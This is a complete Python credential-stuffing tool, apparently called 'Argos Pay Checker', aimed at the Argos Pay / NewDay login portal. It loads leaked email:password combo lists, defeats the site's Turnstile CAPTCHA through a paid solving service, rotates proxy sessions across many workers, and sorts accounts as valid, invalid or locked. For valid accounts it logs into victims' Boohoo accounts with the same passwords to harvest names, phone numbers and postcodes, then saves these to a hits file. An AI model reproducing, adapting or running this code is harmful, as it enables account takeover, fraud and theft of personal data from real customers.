#!/usr/bin/env python3
"""Argos Pay Checker — HTTP-only via Capsolver Turnstile + Angular API.

Flow:
  1. GET login → cookies (XSRF, antiforgery)
  2. Solve Turnstile (Capsolver AntiTurnstileTaskProxyLess)
  3. POST j_username + token → session cookies
  4. POST /authentication/v2/getPasscodeChallenge with XSRF + token
  5. Parse JSON: type=Display + data="Please enter a valid username" → INVALID
                 challengeType present → VALID (2FA required)

Usage: python3 argospay_checker.py
"""

import asyncio, json, os, re, sys, time, traceback, threading
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor
import requests as _requests
from curl_cffi import requests as cr

# ═══ Constants ══════════════════════════════════════════════
BASE = "https://portal.newdaycards.com"
LOGIN_URL = f"{BASE}/argospay/login"
AUTH_URL = f"{BASE}/authentication/v2/getPasscodeChallenge?brand=argospay"
SITEKEY = "0x4AAAAAAD9Cd9itG8GJLeGj"
CAPSOLVER_KEY = "CAP-B8EF89EFBD8B6CB305D242DFD2BDAC1CE0B4C264688F9CF1D03BBBE8535475F1"
CAPSOLVER_API = "https://api.capsolver.com"
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
      "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")
DEFAULT_PROXY = ""
DEFAULT_WORKERS = 50

# ═══ Terminal ════════════════════════════════════════════════
IS_TTY = sys.stdout.isatty()
T="\033[0m";B="\033[1m";D="\033[2m";R="\033[31m";G="\033[32m";Y="\033[33m"
Bl="\033[34m";C="\033[36m";W="\033[97m";g="\033[90m";O="\033[38;5;208m";Yl="\033[38;5;220m"
CLS="\033[2J\033[H"

def cls():
    if IS_TTY: sys.stdout.write(CLS); sys.stdout.flush()
def wlen(s): return len(re.sub(r'\033\[[0-9;]*m','',str(s)))
def pad(s,w): return s+" "*max(0,w-wlen(s))
def banner(t,s=""):
    i=56; o=[f"  {O}{B}╔{'═'*i}╗{T}",
       f"  {O}{B}║{T}{W}{B}{pad(f'  {t}',i)}{T}{O}{B}║{T}"]
    if s: o.append(f"  {O}{B}║{T}{g}{pad(f'  {s}',i)}{T}{O}{B}║{T}")
    o.append(f"  {O}{B}╚{'═'*i}╝{T}"); return "\n".join(o)
def sep(l="",ch="─",w=60):
    if l:
        n=max(1,(w-wlen(l)-2)//2); r=w-wlen(l)-2-n
        return f"  {g}{ch*n} {W}{B}{l}{T}{g} {ch*r}{T}"
    return f"  {g}{ch*w}{T}"
def kv(l,v,vc=C,ind=4,lw=14):
    return f"{' '*ind}{g}{pad(l,lw)}{T} {vc}{v}{T}"
def bar(d,t,w=42):
    f=min(int(w*d/max(t,1)),w); p=int(d*100/t) if t else 0; s=w//3
    if f<=s: b=f"{G}{'━'*f}{g}{'─'*(w-f)}{T}"
    elif f<=s*2: b=f"{G}{'━'*s}{Y}{'━'*(f-s)}{g}{'─'*(w-f)}{T}"
    else: b=f"{G}{'━'*s}{Y}{'━'*s}{O}{'━'*(f-s*2)}{g}{'─'*(w-f)}{T}"
    return b,p
def spin(f): return "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"[f%10]
def _short(s,n): return s[:n]+"..." if s and len(s)>n+3 else (s or "")

# ═══ Capsolver ══════════════════════════════════════════════
def solve_turnstile(timeout=30):
    try:
        r = _requests.post(f"{CAPSOLVER_API}/createTask", json={
            "clientKey": CAPSOLVER_KEY,
            "task": {
                "type": "AntiTurnstileTaskProxyLess",
                "websiteURL": LOGIN_URL,
                "websiteKey": SITEKEY,
                "metadata": {"action": "login"},
            }
        }, timeout=10)
        tid = r.json().get("taskId", "")
        if not tid: return ""
        deadline = time.time() + timeout
        while time.time() < deadline:
            time.sleep(2)
            r2 = _requests.post(f"{CAPSOLVER_API}/getTaskResult",
                json={"clientKey": CAPSOLVER_KEY, "taskId": tid}, timeout=10)
            data = r2.json()
            if data.get("status") == "ready":
                return data["solution"]["token"]
            if data.get("status") == "error":
                return ""
        return ""
    except:
        return ""


# ═══ Phone Lookup (via Boohoo/dbztech GraphQL) ══════════════
def _lookup_phone(email, password, proxy_url=""):
    """Try to fetch phone number from dbztech (Boohoo backend) via curl_cffi."""
    try:
        import uuid as _uuid2, re as _re2
        GUEST_URL = "https://auth.prod.dbztech.net/guest?fascia=boohooww"
        GQL_URL = "https://customer.prod.dbztech.net/graphql"
        UA_APP = "Mozilla/5.0 (iPhone; CPU iPhone OS 18_5 like Mac OS X) AppleWebKit/605.1.15"

        sess = cr.Session(impersonate="chrome131", timeout=12)
        sess.headers.update({"User-Agent": UA_APP, "Accept-Language": "en-US,en;q=0.9"})
        if proxy_url:
            p = proxy_url
            sid = _uuid2.uuid4().hex[:12]
            m = _re2.match(r'(https?://)([^:]+):([^@]+)@(.+)', p)
            if m:
                scheme, user, pwd, host = m.groups()
                user = user.rsplit('-session-', 1)[0]
                p = f'{scheme}{user}-session-{sid}:{pwd}@{host}'
            sess.proxies = {"http": p, "https": p}

        # Guest token
        r = sess.post(GUEST_URL, headers={"accept": "*/*", "content-length": "0"})
        token = r.json().get("access_token", "") if r.status_code == 200 else ""
        if not token: return {}

        # Login
        r = sess.post(GQL_URL,
            json={"operationName": "AppUserCognitoLogin",
                  "variables": {"username": email, "password": password, "fascia": "boohooww"},
                  "query": 'mutation AppUserCognitoLogin($username: String!, $password: String!, $fascia: String!) { appUserCognitoLogin(username: $username, password: $password, fascia: $fascia) { AccessToken IdToken __typename } }'},
            headers={"content-type": "application/json", "authorization": f"Bearer {token}",
                     "x-device-manufacturer": "Apple", "x-platform": "ios", "forward-auth": "true"})
        login = (r.json().get("data") or {}).get("appUserCognitoLogin") or {} if r.status_code == 200 else {}
        id_token = login.get("IdToken", "")
        if not id_token: return {}

        # Get customer
        r = sess.post(GQL_URL,
            json={"operationName": "GetCustomer",
                  "variables": {"fascia": "boohooww"},
                  "query": 'query GetCustomer($fascia: String) { getCustomer(locale: en, fascia: $fascia) { firstName lastName phone addresses { phone postalCode city streetName __typename } __typename } }'},
            headers={"content-type": "application/json", "authorization": f"Bearer {id_token}",
                     "x-platform": "ios"})
        cust = (r.json().get("data") or {}).get("getCustomer") or {}
        if not cust: return {}

        name = f"{cust.get('firstName','')} {cust.get('lastName','')}".strip()
        phone = cust.get("phone", "") or ""
        addr = (cust.get("addresses") or [None])[0] or {}
        if not phone and addr:
            phone = addr.get("phone", "") or ""
        postcode = addr.get("postalCode", "") or ""
        return {"name": name or "", "phone": phone.strip() or "", "postcode": postcode or ""}
    except Exception:
        return {}

# ═══ Core Check ════════════════════════════════════════════
def _sync_check(email, password, proxy_url, extract=True, timeout_sec=20):
    """HTTP-only Argos Pay check. Retries on transient failures."""
    result = {"status": "error", "name": "", "msg": "", "phone": ""}
    username = email.split("@")[0] if "@" in email else email

    for attempt in range(3):
        sess = None
        try:
            sess = cr.Session(impersonate="chrome131", timeout=timeout_sec)
            sess.headers.update({"User-Agent": UA})
            if proxy_url:
                p = proxy_url
                import uuid as _uuid, re as _re
                sid = _uuid.uuid4().hex[:12]
                m = _re.match(r'(https?://)([^:]+):([^@]+)@(.+)', p)
                if m:
                    scheme, user, pwd, host = m.groups()
                    user = user.rsplit('-session-', 1)[0]
                    p = f'{scheme}{user}-session-{sid}:{pwd}@{host}'
                sess.proxies = {"http": p, "https": p}

            # Step 1: GET login page + CSRF
            sess.get(LOGIN_URL, timeout=timeout_sec)
            sess.get(f"{BASE}/api/csrf-token", timeout=timeout_sec)

            # Step 2: Solve Turnstile
            token = solve_turnstile(timeout=40)
            if not token:
                if attempt < 2: time.sleep(attempt + 1); continue
                result["msg"] = "turnstile solve failed"
                sess.close(); return result

            # Step 3: POST form
            sess.post(LOGIN_URL,
                data={"j_username": username},
                headers={"Content-Type": "application/x-www-form-urlencoded", "Origin": BASE,
                "Referer": LOGIN_URL, "cf-turnstile-response": token},
                allow_redirects=True, timeout=timeout_sec)

            # Step 4: Get XSRF
            cookies = dict(sess.cookies)
            xsrf = cookies.get("XSRF-TOKEN", "")
            if not xsrf:
                if attempt < 2: time.sleep(attempt + 1); continue
                result["msg"] = "no XSRF token"
                sess.close(); return result

            # Step 5: API call
            device_info = json.dumps([
                {"key": "userAgent", "value": UA},
                {"key": "webdriver", "value": False},
                {"key": "language", "value": "en-GB"},
                {"key": "platform", "value": "Win32"},
                {"key": "touchSupport", "value": [0, False, False]},
            ])
            r = sess.post(AUTH_URL,
                json={"username": username, "deviceInfo": device_info},
                headers={"Content-Type": "application/json", "Accept": "application/json",
                "X-XSRF-TOKEN": xsrf, "cf-turnstile-response": token,
                "Origin": BASE, "Referer": LOGIN_URL}, timeout=timeout_sec)

            try: resp_data = r.json()
            except:
                if attempt < 2: time.sleep(attempt + 1); sess.close(); continue
                result["msg"] = f"non-JSON: {r.text[:80]}"
                sess.close(); return result

            resp_type = resp_data.get("type", "")
            resp_msg = resp_data.get("data", "") or resp_data.get("message", "")

            if resp_type == "Display" and "valid username" in resp_msg.lower():
                result["status"] = "invalid"
                result["msg"] = "username not found"
                sess.close(); return result
            if "locked" in resp_msg.lower():
                result["status"] = "locked"
                result["msg"] = resp_msg[:80] or "locked"
                sess.close(); return result
            if "challengeType" in r.text or "passcodeChallenge" in r.text:
                result["status"] = "valid"
                result["msg"] = "2FA required"; result["name"] = username
                # Phone lookup via dbztech
                if extract:
                    lookup = _lookup_phone(email, password, proxy_url)
                    if lookup.get("phone"):
                        result["phone"] = lookup["phone"]
                        if lookup.get("name"): result["name"] = lookup["name"]
                sess.close(); return result
            result["status"] = "valid"
            result["msg"] = "credentials accepted"; result["name"] = username
            if extract:
                lookup = _lookup_phone(email, password, proxy_url)
                if lookup.get("phone"): result["phone"] = lookup["phone"]
            sess.close(); return result

        except Exception as e:
            if attempt < 2:
                try: sess.close()
                except: pass
                time.sleep(attempt + 1)
                continue
            result["msg"] = str(e)[:80]
            try: sess.close()
            except: pass
            return result

    return result


# ═══ Stats ══════════════════════════════════════════════════
class Stats:
    def __init__(self, hits_name=""):
        self.done=0; self.valid=0; self.invalid=0; self.errors=0; self.locked=0
        self.recent=[]; self.hits_name=hits_name; self.spin=0

# ═══ Dashboard ══════════════════════════════════════════════
def render_dashboard(s, total, t_start, workers):
    if not IS_TTY: return
    elapsed=max(time.monotonic()-t_start,0.01)
    cpm=int(s.done/(elapsed/60))
    pct=int(s.done*100/total) if total else 0
    eta=(total-s.done)/max(cpm,1)*60 if cpm else 0
    rate=s.valid*100/s.done if s.done else 0
    b,pn=bar(s.done,total); s.spin+=1
    out=[CLS,""]
    out.append(f"  {O}{B}ARGOS PAY  CHECKER{T}  {g}·{T}  {D}HTTP Turnstile · {workers}w{T}")
    out.append(f"  {g}{'─'*60}{T}\n")
    out.append(f"  {b}  {B}{W}{pn:3d}%{T}")
    out.append(f"  {W}{s.done:,}{T}{g}/{total:,}{T}  {g}·{T}  {G}{cpm:,} CPM{T}"
               f"  {g}·{T}  {g}ETA {int(eta//60)}m{int(eta%60):02d}s{T}")
    out.append(f"  {O}hit rate:{T} {W}{rate:.1f}%{T}\n")
    out.append(f"  {G}● {s.valid}{T} valid   {R}● {s.invalid}{T} invalid"
               f"   {Y}● {s.errors}{T} err   {O}● {s.locked}{T} locked")
    if s.recent:
        out.append(f"\n  {g}{'─'*60}{T}")
        for e in s.recent[:8]: out.append(f"  {e}")
    out.append(f"  {g}{'─'*60}{T}\n  {D}  {s.hits_name}{T}")
    sys.stdout.write("\n".join(out)+"\n"); sys.stdout.flush()

# ═══ Runner ══════════════════════════════════════════════════
async def run_async(combos, proxy_url, workers, extract):
    total=len(combos); t_start=time.monotonic()
    hits_file=Path.cwd()/f"argospay_hits_{time.strftime('%Y%m%d_%H%M%S')}.txt"
    fh=open(hits_file,"a",encoding="utf-8"); fh.write(""); fh.flush()
    s=Stats(hits_name=hits_file.name)
    combo_q=asyncio.Queue()
    for c in combos: combo_q.put_nowait(c)
    lock=asyncio.Lock()
    executor=ThreadPoolExecutor(max_workers=workers+5)
    loop=asyncio.get_running_loop(); loop.set_default_executor(executor)
    if IS_TTY: render_dashboard(s,total,t_start,workers)

    async def worker(wid):
        while True:
            try: email,pw=combo_q.get_nowait()
            except asyncio.QueueEmpty: break
            result=await asyncio.to_thread(_sync_check,email,pw,proxy_url,extract)
            async with lock:
                s.done+=1; st=result["status"]
                if st=="valid":
                    s.valid+=1; name=result.get("name",""); msg=result.get("msg","")
                    phone = result.get("phone","")
                    parts = [f"{email}:{pw}"]
                    if name: parts.append(f"Name={name}")
                    if phone: parts.append(f"Phone={phone}")
                    if msg: parts.append(msg)
                    fh.write(" | ".join(parts) + "\n"); fh.flush()
                    disp = f"{G}✓{T} {email:<36s}"
                    if name: disp += f" {D}| {name}{T}"
                    if phone: disp += f" {D}| {phone}{T}"
                    s.recent.append(disp)
                elif st=="invalid": s.invalid+=1
                elif st=="locked": s.locked+=1; fh.write(f"{email}:{pw} | LOCKED\n"); fh.flush()
                else:
                    s.errors+=1
                    msg = result.get("msg", "")
                    # Show first 3 errors so we can diagnose
                    if s.errors <= 3:
                        print(f"      {Y}ERR {s.errors}:{T} {email[:30]:30s} {g}{msg[:60]}{T}", flush=True)
                    if msg and ("turnstile" in msg.lower() or "xsrf" in msg.lower() or "non-json" in msg.lower()):
                        s.recent.append(f"{Y}⚠{T} {email:<36s} {D}| {msg}{T}")
                if len(s.recent)>10: s.recent.pop(0)

    async def rloop():
        last=-1
        while not combo_q.empty() or any(not w.done() for w in wt):
            if s.done!=last: last=s.done; render_dashboard(s,total,t_start,workers)
            await asyncio.sleep(0.3)

    wt=[asyncio.create_task(worker(i)) for i in range(min(workers,total))]
    if IS_TTY: rtask=asyncio.create_task(rloop())
    await asyncio.gather(*wt,return_exceptions=True)
    if IS_TTY: rtask.cancel(); await asyncio.sleep(0); render_dashboard(s,total,t_start,workers)
    fh.close(); executor.shutdown(wait=False)
    elapsed=time.monotonic()-t_start; m,s_=int(elapsed//60),int(elapsed%60)
    cpm=int(total/(elapsed/60)) if elapsed>0 else 0
    print(f"\n  {O}{B}COMPLETE{T}")
    print(f"  {g}{'─'*60}{T}")
    print(f"  {W}{total:,}{T} checked  {g}·{T}  {m}m{s_:02d}s  {g}·{T}  {G}{cpm:,} CPM{T}")
    print(f"  {G}✓ {s.valid} valid{T}  {R}✗ {s.invalid} invalid{T}  "
          f"{Y}⚠ {s.errors} err{T}  {O}🔒 {s.locked} locked{T}")
    if s.valid: print(f"  {G}→{T} {D}{hits_file}{T}"); print()

def run_checker(combos, proxy_url, workers, extract):
    asyncio.run(run_async(combos, proxy_url, workers, extract))

# ═══ Helpers ══════════════════════════════════════════════════
def load_combos(fp):
    if not Path(fp).exists(): return []
    combos=[]
    for line in Path(fp).read_text("utf-8-sig").splitlines():
        line=line.strip()
        if not line or line.startswith("#"): continue
        for sp in [":","|"]:
            if sp in line:
                p=line.split(sp,1)
                if len(p)==2 and "@" in p[0]:
                    combos.append((p[0].strip(),p[1].strip())); break
    return combos

def find_combos():
    found=[]; seen=set()
    for base in [Path("/opt/astro-aio-platform/data/combos"),Path("/opt"),Path("/root")]:
        if not base.exists(): continue
        for p in sorted(base.iterdir()):
            if not p.is_file() or p.suffix.lower()!=".txt": continue
            if p.stat().st_size<100_000 or p.stat().st_size>2e8: continue
            if p.name.startswith(".") or str(p) in seen: continue
            seen.add(str(p))
            found.append((str(p),p.stat().st_size,p.name))
    found.sort(key=lambda x:-x[1]); return found[:15]

# ═══ Config ══════════════════════════════════════════════════
CFG=Path.home()/".argospay.json"
def save_cfg(s):
    try: CFG.write_text(json.dumps({"combo":s.combo,"proxy":s.proxy,"workers":s.workers}))
    except: pass
def load_cfg():
    try:
        if CFG.exists(): return json.loads(CFG.read_text())
    except: pass
    return {}

class S:
    combo=""; proxy=""; workers=DEFAULT_WORKERS

def file_browser():
    files=find_combos()
    if not files:
        print(f"\n  {R}No combo files.{T}")
        p=input(f"  {g}Path:{T} ").strip()
        return p if p and Path(p).exists() else None
    print(f"\n{sep('COMBO FILES')}\n")
    for i,(p,sz,n) in enumerate(files):
        print(f"    {B}{G}[{i}]{T}  {C}{pad(n,44)}{T} {g}{sz/1e6:.1f} MB{T}")
    print(f"\n    {g}[0-{len(files)-1}] select  [m] manual  [q] back{T}")
    c=input(f"  {B}{C}❯ {T}").strip().lower()
    if c=="m": p=input(f"  {g}Path:{T} ").strip(); return p if p and Path(p).exists() else None
    if c=="q": return "__back__"
    try:
        i=int(c)
        if 0<=i<len(files): return files[i][0]
    except: pass
    return None

def menu():
    c=load_cfg()
    S.combo=c.get("combo",""); S.proxy=c.get("proxy",""); S.workers=c.get("workers",DEFAULT_WORKERS)
    while True:
        cls()
        n=len(load_combos(S.combo)) if S.combo else 0
        cs=Path(S.combo).name if S.combo else f"{g}—{T}"; cn=f"{D}({n:,}){T}" if n else ""
        ps=_short(S.proxy,30) if S.proxy else f"{g}DIRECT{T}"
        print("\n".join(["",
            banner("ARGOS PAY  CHECKER","HTTP Turnstile · Capsolver · ~10 CPM per worker"),
            "",sep("CONFIG"),"",
            kv("Combo",f"{cs} {cn}"),
            kv("Proxy",ps,vc=C if S.proxy else Y),
            kv("Workers",f"{S.workers}",vc=C),
            kv("Engine",f"{Yl}AntiTurnstileTaskProxyLess{T}",vc=Yl),
            "",sep("MENU"),"",
            f"    {B}{G}▶ [1]{T}  {W}Start Checking{T}",
            f"       {C}[2]{T}  {g}Combo File{T}",
            f"       {C}[3]{T}  {g}Proxy (empty=direct){T}",
            f"       {C}[4]{T}  {g}Workers (1-20){T}",
            f"       {R}[q]{T}  {g}Quit{T}","",
        ]))
        ch=input(f"  {B}{C}❯ {T}").strip().lower()
        if ch=="1":
            if not S.combo: print(f"\n  {R}Set combo first.{T}"); input(); continue
            combos=load_combos(S.combo)
            if not combos: print(f"\n  {R}No combos.{T}"); input(); continue
            save_cfg(S)
            print(f"\n  {C}Checking {len(combos):,} with {S.workers} workers...{T}\n")
            try: run_checker(combos,S.proxy,S.workers,True)
            except KeyboardInterrupt: print(f"\n  {Y}Stopped.{T}")
            except Exception as e: print(f"\n  {R}{e}{T}"); traceback.print_exc()
            input(f"\n  {g}Enter...{T}")
        elif ch=="2":
            p=file_browser()
            if p=="__back__": continue
            if p: S.combo=p; save_cfg(S)
        elif ch=="3":
            v=input(f"  {g}Proxy (empty=direct):{T} ").strip(); S.proxy=v; save_cfg(S)
        elif ch=="4":
            try: w=input(f"  {g}Workers (1-300):{T} ").strip(); S.workers=max(1,min(300,int(w))); save_cfg(S)
            except: pass
        elif ch=="q": cls(); break

if __name__=="__main__":
    try: menu()
    except KeyboardInterrupt: cls(); print(f"\n{g}Exited.{T}")
